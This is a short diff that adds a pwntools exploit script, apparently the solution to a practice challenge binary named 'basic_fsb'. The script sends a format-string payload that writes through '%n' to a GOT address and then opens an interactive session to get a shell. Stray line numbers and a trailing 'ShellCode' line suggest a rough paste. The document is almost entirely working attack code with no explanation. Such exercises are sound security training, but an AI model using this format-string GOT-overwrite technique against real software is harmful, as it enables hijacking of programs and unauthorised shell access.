@@ -1,0 +1,10 @@
+__________________________
+from pwn import *
+  2 p = process('./basic_fsb')
+  3 got = 0x804A00C
+  4 pay = p32(got)
+  5 pay += b"%134514096x%n"
+  6 p.sendline(pay)
+  7 p.interactive()
+___________________________
+ShellCode
